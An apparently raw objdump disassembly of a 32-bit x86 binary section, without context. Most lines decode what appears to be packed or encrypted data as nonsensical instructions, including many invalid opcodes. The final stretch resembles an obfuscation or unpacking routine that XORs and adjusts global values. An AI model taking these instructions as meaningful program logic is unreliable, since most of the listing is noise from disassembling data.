  40417d:	xchg   edi,eax
  40417e:	sahf   
  40417f:	fucomp st(2)
  404181:	nop
  404182:	js     0x4041a7
  404184:	adc    al,0x7d
  404186:	loope  0x4041b0
  404188:	je     0x404174
  40418a:	sub    dh,BYTE PTR [edx-0x34e02e16]
  404190:	cmp    al,0x3f
  404192:	je     0x404180
  404194:	cmp    ecx,DWORD PTR [ecx+0x3d]
  404197:	jne    0x4041a1
  404199:	out    0x50,eax
  40419b:	rcr    DWORD PTR [ecx+ebp*2-0x45],1
  40419f:	and    edi,DWORD PTR [edi-0x1e]
  4041a2:	mov    dl,0xea
  4041a4:	and    edx,ecx
  4041a6:	and    eax,0x918a7b9a
  4041ab:	or     al,0x7e
  4041ad:	div    BYTE PTR [ebp-0x62e4917c]
  4041b3:	jg     0x40416e
  4041b5:	cmp    al,0xda
  4041b7:	imul   ebp,DWORD PTR [edi+esi*2-0x34],0x8bbb843d
  4041bf:	cmp    eax,0x950dfefa
  4041c4:	mov    fs,WORD PTR [edi+0x1e9f5889]
  4041ca:	jmp    0xd165:0xb2a78df7
  4041d1:	mov    ebx,0x46a876f6
  4041d6:	adc    ebx,DWORD PTR [ebp-0x65]
  4041d9:	sahf   
  4041da:	sub    al,0x4
  4041dc:	push   edi
  4041dd:	xchg   edi,eax
  4041de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041df:	push   esi
  4041e0:	rcr    BYTE PTR [ebx],0x7c
  4041e3:	sub    dl,BYTE PTR [esi]
  4041e5:	jnp    0x40419a
  4041e7:	ficom  WORD PTR [ebp+0x2deff5b5]
  4041ed:	lock mov dh,0x5
  4041f0:	xchg   ebp,eax
  4041f1:	mov    edi,0x98cee860
  4041f6:	or     ebp,DWORD PTR [edi-0x7b91c3b5]
  4041fc:	jmp    0xdb3a23b4
  404201:	inc    ecx
  404202:	mov    esp,0xb26712a8
  404207:	mov    bh,0xb6
  404209:	pusha  
  40420a:	scas   eax,DWORD PTR es:[edi]
  40420b:	stos   DWORD PTR es:[edi],eax
  40420c:	cs mov ah,0x37
  40420f:	sti    
  404210:	aaa    
  404211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404213:	sbb    al,0x91
  404216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404217:	adc    al,0x86
  404219:	sub    bh,cl
  40421b:	aas    
  40421c:	pop    edi
  40421d:	pop    eax
  40421e:	cli    
  40421f:	cmp    al,0x41
  404221:	xchg   ebx,eax
  404222:	mov    BYTE PTR [ebx],bl
  404224:	adc    edi,DWORD PTR [esi]
  404226:	push   esi
  404227:	push   cs
  404228:	and    eax,0x55ed690e
  40422d:	mov    al,ds:0x4840aa72
  404232:	repnz enter 0x2add,0x1b
  404237:	nop
  404238:	pop    DWORD PTR [eax-0x7d]
  40423b:	clc    
  40423c:	inc    eax
  40423d:	mov    DWORD PTR ds:0x42fd6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	movaps xmm1,XMMWORD PTR [esi+0x184faaa3]
  40425e:	jo     0x4042d0
  404260:	cmp    eax,0x4070707d
  404265:	fs leave 
  404267:	ret    0x2988
  40426a:	and    BYTE PTR [ebx-0x1c066754],bl
  404270:	sbb    edi,esi
  404272:	push   ds
  404273:	div    esi
  404275:	push   cs
  404276:	add    eax,0x53562594
  40427b:	adc    dh,BYTE PTR [ebx]
  40427d:	pop    eax
  40427e:	mov    ecx,0x2fe745aa
  404283:	aam    0xd3
  404285:	cmp    DWORD PTR [ebp+esi*8-0x42],edi
  404289:	lea    ebx,[edi-0x53082493]
  40428f:	test   DWORD PTR [edx-0x4794e4ad],edi
  404295:	xchg   ebx,eax
  404296:	and    bl,BYTE PTR [ebx-0x62c3e5a9]
  40429c:	loop   0x4042c4
  40429e:	dec    ecx
  40429f:	cmp    BYTE PTR [ebx+0x7d],cl
  4042a2:	jp     0x404275
  4042a4:	std    
  4042a5:	cld    
  4042a6:	jo     0x404302
  4042a8:	dec    esi
  4042a9:	retf   
  4042aa:	out    0xda,eax
  4042ac:	idiv   BYTE PTR [ebx-0x1d]
  4042af:	jecxz  0x404283
  4042b1:	pop    ss
  4042b2:	loope  0x4042e3
  4042b4:	loopne 0x4042b6
  4042b6:	push   edx
  4042b7:	xchg   ecx,eax
  4042b8:	mov    ch,0x4f
  4042ba:	sbb    eax,0xa8657c83
  4042bf:	jmp    0xca21:0x709bd79f
  4042c6:	push   ss
  4042c7:	lods   al,BYTE PTR ds:[esi]
  4042c8:	xor    edx,DWORD PTR [edi-0x663c87be]
  4042ce:	stc    
  4042cf:	outs   dx,DWORD PTR ds:[esi]
  4042d0:	fwait
  4042d1:	pop    es
  4042d2:	and    DWORD PTR [esi-0x21],eax
  4042d5:	add    BYTE PTR [esi+0x6],bh
  4042d8:	ins    BYTE PTR es:[edi],dx
  4042d9:	std    
  4042da:	into   
  4042db:	push   eax
  4042dc:	dec    eax
  4042dd:	enter  0x2aad,0xeb
  4042e1:	pop    edx
  4042e2:	outs   dx,BYTE PTR ds:[esi]
  4042e3:	lahf   
  4042e4:	aas    
  4042e5:	mov    esi,DWORD PTR [edx]
  4042e7:	es out 0xa2,eax
  4042ea:	adc    bh,ch
  4042ec:	jg     0x4042fd
  4042ee:	pop    eax
  4042ef:	gs retf 0xae0e
  4042f3:	std    
  4042f4:	ss dec ebx
  4042f6:	ins    DWORD PTR es:[edi],dx
  4042f7:	or     al,0x33
  4042f9:	push   eax
  4042fa:	test   DWORD PTR [ecx],ebx
  4042fc:	cwde   
  4042fd:	adc    ebp,DWORD PTR ds:0xbb600ca6
  404303:	adc    al,0x65
  404305:	pushf  
  404306:	sahf   
  404307:	jno    0x40436a
  404309:	rol    BYTE PTR [esi+0xf777681],cl
  40430f:	and    DWORD PTR [esi-0x58],esp
  404312:	push   ss
  404313:	cmc    
  404314:	jae    0x4042b4
  404316:	je     0x4042f8
  404318:	inc    ah
  40431a:	mov    dl,0xa9
  40431c:	(bad)  
  40431e:	cmp    eax,0xb1e059da
  404323:	jbe    0x40436b
  404325:	mov    dl,0x30
  404327:	pop    ss
  404328:	inc    edx
  404329:	or     BYTE PTR [edx-0x47],0xe5
  40432d:	push   ebp
  40432e:	cmp    DWORD PTR [ecx+0x1a5812a6],ebx
  404334:	and    DWORD PTR [edi],edi
  404336:	les    eax,FWORD PTR [edi+0x76c889b4]
  40433c:	clc    
  40433d:	jl     0x4042e0
  40433f:	sar    DWORD PTR [eax+0x3d7adad8],0xcc
  404346:	in     eax,0xb0
  404348:	aam    0x2d
  40434a:	ret    
  40434b:	pop    es
  40434c:	les    ecx,FWORD PTR [ebp+0xf]
  40434f:	cmp    al,0x96
  404351:	and    ah,cl
  404353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404354:	loop   0x404321
  404356:	(bad)  
  404357:	xchg   esi,eax
  404358:	lock adc eax,0x4abc0ca2
  40435e:	and    al,0x3d
  404360:	add    DWORD PTR [edx-0x6f08b28d],edi
  404366:	mov    cl,0xfe
  404368:	es cs daa 
  40436b:	rcr    BYTE PTR [esi+0x4256be17],cl
  404371:	and    BYTE PTR [edi-0x36],0x78
  404375:	adc    esp,DWORD PTR [edi-0x2e]
  404378:	or     ch,dl
  40437a:	out    dx,eax
  40437b:	mov    ebx,0xf8453300
  404380:	dec    ebp
  404381:	mov    bh,0x63
  404383:	cmp    cl,BYTE PTR [ecx+0x5f]
  404386:	add    eax,0xf48a2aff
  40438b:	lds    ebp,FWORD PTR [esi+esi*8]
  40438e:	clc    
  40438f:	mov    edi,0x1c7e1697
  404394:	dec    edx
  404395:	dec    esp
  404396:	adc    eax,DWORD PTR [eax+0x8825375]
  40439c:	mov    WORD PTR [edi+eiz*8-0x741e5827],es
  4043a3:	out    0x99,al
  4043a5:	imul   ebx,DWORD PTR [eax-0x52],0xffffff8c
  4043a9:	aaa    
  4043aa:	mov    edx,0xd0e1618f
  4043af:	in     eax,dx
  4043b0:	mov    ds:0x2b963308,al
  4043b5:	shr    eax,1
  4043b7:	leave  
  4043b8:	test   eax,0x228266e7
  4043bd:	fst    QWORD PTR [ecx]
  4043bf:	jecxz  0x40440d
  4043c1:	mov    esp,0x2295cbb1
  4043c6:	cmp    al,cl
  4043c8:	xchg   ebp,eax
  4043c9:	(bad)  
  4043ca:	mov    esi,0x1b759341
  4043cf:	ins    DWORD PTR es:[edi],dx
  4043d0:	xchg   DWORD PTR [edi+0x2f],ecx
  4043d3:	pop    es
  4043d4:	fimul  WORD PTR [ebp+0x7fe852ea]
  4043da:	add    BYTE PTR [eax],ch
  4043dc:	dec    ebx
  4043dd:	inc    esi
  4043de:	adc    ch,BYTE PTR ds:0x3dbf55cb
  4043e4:	mov    ch,0x36
  4043e6:	loop   0x40445e
  4043e8:	vmread DWORD PTR [eax+0x29],ebp
  4043ec:	adc    eax,0x1423b92
  4043f1:	push   esp
  4043f2:	xchg   dl,cl
  4043f4:	mov    dl,0x1d
  4043f6:	enter  0xc6ef,0x36
  4043fa:	stc    
  4043fb:	mov    BYTE PTR [ebx],ch
  4043fd:	mov    ds:0x87059069,al
  404402:	mov    WORD PTR [eax+0x16],ss
  404405:	and    esp,DWORD PTR [edx-0x129e2e16]
  40440b:	cmp    al,0x6c
  40440d:	aad    0x80
  40440f:	or     al,0xe0
  404411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404412:	ds hlt 
  404414:	push   ecx
  404415:	fild   QWORD PTR [edx-0x6]
  404418:	jae    0x404432
  40441a:	addr16 jo 0x404463
  40441d:	retf   0x28aa
  404420:	add    al,0x10
  404422:	or     al,0xdc
  404424:	inc    esp
  404425:	push   ss
  404426:	outs   dx,DWORD PTR ds:[esi]
  404427:	jmp    0xb20f:0xcb9161ad
  40442e:	call   0xa6e00115
  404433:	cmp    eax,0xf4dc5390
  404438:	xor    BYTE PTR [edi+0xef273f2],dh
  40443e:	test   al,0xe9
  404441:	sbb    al,0x8
  404443:	xor    DWORD PTR [eax+0x70c539ee],0xffffffa4
  40444a:	mov    edi,0x9f6bbb6
  40444f:	cmp    DWORD PTR [ecx-0x472e858c],ebx
  404455:	aad    0x51
  404457:	sbb    eax,0xc89304fc
  40445c:	mov    dl,BYTE PTR [ecx-0x5eb10d88]
  404462:	fldcw  WORD PTR [edi]
  404464:	add    cl,BYTE PTR ds:0xd1186ba6
  40446a:	into   
  40446b:	int    0x3c
  40446d:	stc    
  40446e:	pop    esi
  40446f:	add    eax,0x1118d469
  404474:	mov    al,ds:0xa3871e27
  404479:	ror    edi,cl
  40447b:	jns    0x404412
  40447d:	xor    esp,esp
  40447f:	dec    ebx
  404480:	mov    ebx,0xa0194c08
  404485:	sti    
  404486:	iret   
  404487:	cmc    
  404488:	xchg   ebx,eax
  404489:	je     0x4044d6
  40448b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40448c:	or     BYTE PTR [ebx+esi*2-0x7c],cl
  404490:	(bad)  
  404491:	fdivp  st(2),st
  404493:	mov    dl,al
  404495:	mov    ah,0x6e
  404497:	(bad)  
  404498:	mov    eax,DWORD PTR [eax]
  40449a:	mov    al,ds:0x7d0c4f2a
  40449f:	xchg   esi,eax
  4044a0:	pop    esi
  4044a1:	pop    es
  4044a2:	xchg   edx,eax
  4044a3:	adc    WORD PTR [ebx],sp
  4044a6:	mov    ch,0x1e
  4044a8:	jbe    0x404499
  4044aa:	jno    0x404504
  4044ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044ad:	mov    eax,0x25e4fc71
  4044b2:	jl     0x404491
  4044b4:	out    0x6e,al
  4044b6:	push   eax
  4044b7:	push   0xb658bf12
  4044bc:	inc    edi
  4044bd:	pop    esp
  4044be:	sub    DWORD PTR [ebp-0x59],ebp
  4044c1:	dec    edi
  4044c2:	loope  0x40444b
  4044c4:	mov    edx,0x50699b6d
  4044c9:	cld    
  4044ca:	jmp    0x40452e
  4044cc:	inc    ebx
  4044cd:	push   edi
  4044ce:	jl     0x4044f7
  4044d0:	outs   dx,BYTE PTR ds:[esi]
  4044d1:	add    ebx,DWORD PTR [ebx-0x40]
  4044d4:	test   DWORD PTR [eax+0x26d61845],0xd22bfbe6
  4044de:	in     al,dx
  4044df:	adc    DWORD PTR [ecx+0x0],ebx
  4044e2:	call   0x4cfd:0xf6d3b0de
  4044e9:	add    ecx,DWORD PTR [eax]
  4044eb:	ret    
  4044ec:	in     eax,0xf3
  4044ee:	int3   
  4044ef:	sub    DWORD PTR ds:0x5277dfd2,esi
  4044f5:	pusha  
  4044f6:	or     ah,BYTE PTR [edi+0x45541a4c]
  4044fc:	dec    esp
  4044fd:	mov    al,ds:0x5254af66
  404502:	and    BYTE PTR [eax+0x55],dl
  404505:	retf   
  404506:	lods   eax,DWORD PTR ds:[esi]
  404507:	inc    esp
  404508:	(bad)  
  40450a:	jne    0x404494
  40450c:	or     al,0x7b
  40450e:	scas   al,BYTE PTR es:[edi]
  40450f:	mov    al,0x4
  404511:	mov    eax,ds:0xfe4816e6
  404516:	inc    edi
  404517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404518:	ja     0x404527
  40451a:	jle    0x404580
  40451c:	cmp    eax,0x65afc8bc
  404521:	cld    
  404522:	and    dh,dl
  404524:	prefetch BYTE PTR [ebx]
  404527:	shl    DWORD PTR [edx],cl
  404529:	jg     0x40450e
  40452b:	jecxz  0x404508
  40452d:	xchg   BYTE PTR [ecx+edx*1+0x158991b0],bl
  404534:	xor    eax,0xb8e3e184
  404539:	call   0xe340bbbf
  40453e:	inc    ebx
  40453f:	or     BYTE PTR [esi+ebx*2-0x7b],ch
  404543:	push   ebx
  404544:	les    esp,FWORD PTR [edx]
  404546:	dec    ecx
  404547:	or     dh,BYTE PTR [ebp-0x6f]
  40454a:	sub    dh,BYTE PTR [eax-0x1bed1856]
  404550:	inc    eax
  404551:	xor    DWORD PTR [edx-0x71],esi
  404554:	adc    al,0x4b
  404556:	mov    edx,0x4954237b
  40455b:	inc    esi
  40455c:	inc    eax
  40455d:	das    
  40455e:	sti    
  40455f:	sub    esp,DWORD PTR [ecx+0x40]
  404562:	test   BYTE PTR [esi+0x2a],dl
  404565:	int    0xa
  404567:	loop   0x404571
  404569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40456a:	and    BYTE PTR [esi],0xf
  40456d:	mov    edi,0x15f6f800
  404572:	dec    esi
  404573:	ret    0x218
  404576:	imul   esi,eax,0xffffff8c
  404579:	pop    esi
  40457a:	xor    al,0xb8
  40457c:	xor    al,0x3a
  40457e:	mov    ebp,0xfa020f4a
  404583:	dec    edx
  404584:	push   esp
  404585:	int3   
  404586:	xor    eax,DWORD PTR [ebp+0x241bf59d]
  40458c:	rol    BYTE PTR [ebx-0x3bbe8773],0xc4
  404593:	and    ch,dl
  404595:	sub    edx,edi
  404597:	xchg   edx,eax
  404598:	xor    eax,0xa3988768
  40459d:	xchg   ecx,eax
  40459e:	inc    edi
  40459f:	sbb    edi,ecx
  4045a1:	cs add ecx,ebp
  4045a4:	call   0x824f52c3
  4045a9:	adc    ecx,edi
  4045ab:	(bad)  
  4045ac:	jmp    DWORD PTR [ecx]
  4045ae:	adc    eax,0x42fd82
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	cmp    eax,0xc3ce7e0
  4045cc:	and    al,0x70
  4045ce:	jo     0x40460d
  4045d0:	jge    0x404642
  4045d2:	jo     0x4045f0
  4045d4:	pop    ebx
  4045d5:	mov    dl,0x6d
  4045d7:	sub    al,0xe1
  4045d9:	jmp    0xd0e4:0x3655bd91
  4045e0:	enter  0xea5e,0xf1
  4045e4:	pop    ebx
  4045e5:	pop    edi
  4045e6:	pop    ebp
  4045e7:	call   0xe604:0x59815350
  4045ee:	and    dl,BYTE PTR [esi+0x2b]
  4045f1:	loop   0x4045c0
  4045f3:	pop    ebp
  4045f4:	call   0xe7f2:0x4a866925
  4045fb:	bound  ecx,QWORD PTR [ebp+0x27055e74]
  404601:	gs dec ebp
  404603:	xor    al,bl
  404605:	pop    esi
  404606:	loop   0x40464e
  404608:	jg     0x404663
  40460a:	jnp    0x404655
  40460c:	sti    
  40460d:	jns    0x4045c5
  40460f:	gs jns 0x404676
  404612:	stos   BYTE PTR es:[edi],al
  404613:	xchg   ecx,eax
  404614:	icebp  
  404615:	test   eax,0x52e2e381
  40461a:	and    DWORD PTR [edx],0xc9030be8
  404620:	jnp    0x404657
  404622:	and    BYTE PTR [eax+0x326039a0],al
  404628:	mov    WORD PTR [edx-0x72],gs
  40462b:	xchg   ebp,eax
  40462c:	or     eax,0xa920bf4e
  404631:	loop   0x40464f
  404633:	xor    ch,BYTE PTR [ebx]
  404635:	inc    ecx
  404636:	bound  ebp,QWORD PTR [eax-0x6d]
  404639:	mov    dl,0x7f
  40463b:	mov    DWORD PTR [ecx],eax
  40463d:	xor    DWORD PTR [edi],esi
  40463f:	gs (bad) 
  404641:	and    al,0x69
  404643:	pop    ebx
  404644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404645:	sti    
  404646:	ins    DWORD PTR es:[edi],dx
  404647:	lock mov edi,0x17e8afb9
  40464d:	popf   
  40464e:	mov    edi,0xac4dfeb6
  404653:	ror    DWORD PTR fs:0xdbfe8b75,0x73
  40465b:	stos   BYTE PTR es:[edi],al
  40465c:	add    dl,BYTE PTR [ebx]
  40465e:	jle    0x40467f
  404660:	fistp  WORD PTR ds:0x9f199b86
  404666:	dec    ecx
  404667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404668:	mov    edx,0x92d0d471
  40466d:	dec    ebp
  40466e:	jmp    0x6e7c:0x5feb549e
  404675:	nop
  404676:	sub    ebx,DWORD PTR [esi]
  404678:	jbe    0x4046b1
  40467a:	retf   0x3ff5
  40467d:	push   edi
  40467e:	hlt    
  40467f:	bound  eax,QWORD PTR [edx-0x5c]
  404682:	fdecstp 
  404684:	int    0x9e
  404686:	jb     0x40465c
  404688:	add    eax,0x7e4dcd9b
  40468d:	and    BYTE PTR [ebx],bh
  40468f:	ds out dx,eax
  404691:	mov    ebp,0xb11a8c7d
  404696:	test   cl,ch
  404698:	mov    BYTE PTR [edx+0x6210b0ef],bh
  40469e:	dec    esi
  40469f:	cwde   
  4046a0:	(bad)  
  4046a1:	mov    gs,WORD PTR [ecx-0x28]
  4046a4:	sub    esi,DWORD PTR [ebx+0x521f601f]
  4046aa:	fdivr  DWORD PTR [edx-0x16]
  4046ad:	pop    ebp
  4046af:	xchg   esi,eax
  4046b0:	test   DWORD PTR [edx+0x3ef34526],edi
  4046b6:	add    ecx,ecx
  4046b8:	js     0x4046ef
  4046ba:	add    BYTE PTR [eax],dl
  4046bc:	jecxz  0x4046c0
  4046be:	push   cs
  4046bf:	xor    bl,dh
  4046c1:	fld    DWORD PTR [ebp+0x54]
  4046c4:	fimul  DWORD PTR cs:[ecx]
  4046c7:	stos   BYTE PTR es:[edi],al
  4046c8:	scas   eax,DWORD PTR es:[edi]
  4046c9:	aad    0xae
  4046cb:	pop    esi
  4046cc:	pop    ecx
  4046cd:	(bad)  
  4046cf:	(bad)  
  4046d0:	(bad)  [ebp+0x62]
  4046d3:	xchg   ecx,eax
  4046d4:	sub    al,0xc1
  4046d6:	shl    BYTE PTR [edx-0x56f8e19b],0x21
  4046dd:	dec    esp
  4046de:	push   es
  4046df:	sbb    eax,0x42689445
  4046e4:	sar    ebp,1
  4046e6:	int    0xd9
  4046e8:	mov    esp,0xa3ac947b
  4046ed:	jae    0x404766
  4046ef:	sub    BYTE PTR [edi+0x4bcbaf],ah
  4046f5:	in     al,0xcf
  4046f7:	out    0x0,al
  4046f9:	and    edi,esi
  4046fb:	loope  0x4046a5
  4046fd:	mov    cl,0x70
  4046ff:	xchg   ecx,eax
  404700:	mov    esp,0x2296512a
  404705:	scas   eax,DWORD PTR es:[edi]
  404706:	push   esi
  404707:	xlat   BYTE PTR ds:[ebx]
  404708:	jecxz  0x40470a
  40470a:	(bad)  
  40470b:	inc    eax
  40470c:	push   ecx
  40470d:	int    0x7b
  40470f:	pop    esp
  404710:	cmp    BYTE PTR [eax+0x703a3b0a],dh
  404716:	jmp    0x710b:0xadcab03d
  40471d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40471e:	pop    eax
  40471f:	jae    0x40472a
  404721:	mov    al,0xa0
  404723:	push   ebp
  404724:	push   0xffffff94
  404726:	push   cs
  404727:	push   edi
  404728:	pop    esi
  404729:	out    0x71,eax
  40472b:	pop    DWORD PTR [ecx]
  40472d:	pop    esp
  40472e:	jg     0x40473f
  404730:	enter  0x8534,0x2d
  404734:	aas    
  404735:	inc    eax
  404736:	or     BYTE PTR [esi+0x77],cl
  404739:	or     dl,BYTE PTR [edx+ebp*8-0x51]
  40473d:	adc    al,0xaf
  40473f:	je     0x404710
  404741:	je     0x4046e4
  404743:	lods   al,BYTE PTR ds:[esi]
  404744:	xor    ebx,DWORD PTR [eax-0x43]
  404747:	retf   
  404748:	int3   
  404749:	mov    bl,0x7
  40474b:	mov    bh,0xf5
  40474d:	gs popa 
  40474f:	aaa    
  404750:	out    0xcd,eax
  404752:	adc    edx,esi
  404754:	inc    edx
  404755:	(bad)  
  404756:	in     al,dx
  404757:	loop   0x404780
  404759:	inc    edx
  40475a:	(bad)  
  40475b:	fadd   QWORD PTR [edx+0x2626f413]
  404761:	pop    ebp
  404762:	enter  0x2abe,0xa7
  404766:	dec    ebx
  404767:	cld    
  404768:	dec    edi
  404769:	add    BYTE PTR [ebx+0x48749210],0xc3
  404770:	call   0xdd3:0xaa0d10d5
  404777:	imul   ebx,edi,0xffffffd0
  40477a:	aam    0x7a
  40477c:	jb     0x404704
  40477e:	int    0x30
  404780:	loop   0x40470b
  404782:	push   edx
  404783:	adc    eax,DWORD PTR [ecx+0x4c0a3557]
  404789:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40478a:	jg     0x4047e6
  40478c:	push   0x48
  40478e:	or     ah,BYTE PTR ds:0x9bd206c4
  404794:	out    0xf5,eax
  404796:	lock inc ebx
  404798:	sahf   
  404799:	arpl   WORD PTR [eax+0x3],si
  40479c:	cdq    
  40479d:	dec    eax
  40479e:	in     eax,dx
  40479f:	daa    
  4047a0:	xor    edx,edx
  4047a2:	and    edi,DWORD PTR [ebx]
  4047a4:	outs   dx,DWORD PTR ds:[esi]
  4047a5:	xlat   BYTE PTR ds:[ebx]
  4047a6:	ins    BYTE PTR es:[edi],dx
  4047a7:	mov    esi,edx
  4047a9:	sub    eax,0x28759b06
  4047ae:	rcr    DWORD PTR [edi-0x2590b8ad],1
  4047b4:	push   esi
  4047b5:	rol    BYTE PTR ds:0x312f3fff,cl
  4047bb:	jmp    0x7cb128e
  4047c0:	push   es
  4047c1:	leave  
  4047c2:	mov    cl,0x98
  4047c4:	mov    ebp,0x40fbac33
  4047c9:	mov    ch,0xc6
  4047cb:	xchg   ebp,eax
  4047cc:	cmp    al,BYTE PTR [edi-0x104f62e3]
  4047d2:	fisubr WORD PTR [ebp-0x5b]
  4047d5:	aam    0x5a
  4047d7:	fiadd  WORD PTR ds:0xe696f353
  4047dd:	lods   al,BYTE PTR ds:[esi]
  4047de:	int    0x58
  4047e0:	add    BYTE PTR [ecx-0x71],ch
  4047e3:	shl    DWORD PTR [eax-0x11d4ce9f],1
  4047e9:	pop    ebp
  4047ea:	and    DWORD PTR [esi],0x15
  4047ed:	jg     0x404785
  4047ef:	xchg   ebx,eax
  4047f0:	sbb    DWORD PTR [ecx-0x3e],edi
  4047f3:	push   esi
  4047f4:	bound  esp,QWORD PTR ds:0x999f19ce
  4047fa:	jmp    0xc7e3:0x1a0bd35
  404801:	jecxz  0x40484f
  404803:	dec    esp
  404804:	mov    ecx,0x5986cb2d
  404809:	test   DWORD PTR ds:0xe83f353e,ebp
  40480f:	(bad)  
  404810:	sub    DWORD PTR [ecx+0x17ab75ed],esi
  404816:	dec    edi
  404817:	lds    edx,FWORD PTR es:0x9cebd55a
  40481e:	mov    esp,0x9cd85025
  404823:	inc    ecx
  404824:	mov    ss,WORD PTR [esi]
  404826:	aam    0x10
  404828:	and    ah,BYTE PTR [edi-0x1cb4536b]
  40482e:	jno    0x404800
  404830:	sub    BYTE PTR [esi+eax*1-0x55],0x57
  404835:	sub    esi,DWORD PTR [ecx+0x4653400a]
  40483b:	(bad)  
  40483d:	int3   
  40483e:	jns    0x4047d7
  404840:	sub    eax,0xb65a3b96
  404845:	es xchg ecx,eax
  404847:	cli    
  404848:	or     al,0xa9
  40484a:	mov    DWORD PTR [edi],esp
  40484c:	in     al,0x86
  40484e:	gs loopne 0x4048b3
  404851:	jne    0x4047ec
  404853:	mov    dl,0x9a
  404855:	mov    dl,bl
  404857:	cmp    ch,ah
  404859:	mov    eax,DWORD PTR [ebp+0x48]
  40485c:	jg     0x404817
  40485e:	scas   eax,DWORD PTR es:[edi]
  40485f:	pop    ds
  404860:	and    al,0x5c
  404862:	test   DWORD PTR ds:0x2dd2912d,eax
  404868:	nop
  404869:	sub    BYTE PTR [edi],al
  40486b:	push   bx
  40486d:	mov    dh,0x94
  40486f:	jno    0x40486a
  404871:	dec    eax
  404872:	mov    eax,0xec56cc7
  404877:	ja     0x40483a
  404879:	(bad)  
  40487a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40487b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40487c:	cmp    eax,0xb376370e
  404881:	iret   
  404882:	add    ebp,0x6d
  404885:	sub    DWORD PTR [ebx],ebp
  404887:	push   ds
  404888:	popa   
  404889:	jb     0x4048ec
  40488b:	pop    edi
  40488c:	cli    
  40488d:	jg     0x4048a7
  40488f:	inc    ecx
  404890:	rol    BYTE PTR [esi+0x373ad0ed],1
  404896:	scas   eax,DWORD PTR es:[edi]
  404897:	ret    
  404898:	gs pop edx
  40489a:	add    al,0xa
  40489c:	inc    ebp
  40489d:	push   edx
  40489e:	push   ecx
  40489f:	into   
  4048a0:	ror    BYTE PTR [esp+ecx*2],0x62
  4048a4:	dec    eax
  4048a5:	mov    esi,0x7935c922
  4048aa:	mov    ecx,0xbe221a33
  4048af:	dec    edx
  4048b0:	dec    eax
  4048b1:	pop    edx
  4048b2:	add    ah,BYTE PTR ds:0x6f15a5fd
  4048b8:	sbb    eax,0xb9d3700d
  4048bd:	stos   BYTE PTR es:[edi],al
  4048be:	cdq    
  4048bf:	and    BYTE PTR [ebx+0x5f01007e],dh
  4048c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048c6:	push   esp
  4048c7:	(bad)  
  4048c8:	ja     0x40492d
  4048ca:	mov    ebx,0x9e4722f
  4048cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048d0:	jmp    0x3851:0xafea148d
  4048d7:	xchg   ebp,eax
  4048d8:	cmp    dh,BYTE PTR [edi+ebp*8]
  4048db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048dc:	push   0x282f32f6
  4048e1:	aas    
  4048e2:	mov    eax,ds:0x787cca64
  4048e7:	or     esp,edi
  4048e9:	jae    0x4048f8
  4048eb:	mov    esp,0xe498482c
  4048f0:	cmp    al,0x2
  4048f2:	xchg   ecx,eax
  4048f3:	das    
  4048f4:	xchg   ebp,eax
  4048f5:	out    0xf8,eax
  4048f7:	or     al,0xcb
  4048f9:	inc    ecx
  4048fa:	sub    al,0x2a
  4048fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048fd:	push   edx
  4048fe:	imul   esi,ebx,0xffffffb3
  404901:	cmc    
  404902:	rcr    dl,1
  404904:	inc    esi
  404905:	inc    edx
  404906:	pusha  
  404907:	and    eax,0x5214f2a8
  40490c:	es mov dh,0xa8
  40490f:	mov    dl,BYTE PTR [ecx+0x6c]
  404912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404913:	imul   ebp,DWORD PTR [eax+0x5],0xffffff8b
  404917:	inc    ebp
  404918:	hlt    
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e11c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e124,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e6ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e134,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd05,0x42e134
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fd7a,0x42fcf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fd7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e703,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd82,0x42fd7e
  40499b:	xor    eax,0x8a3e
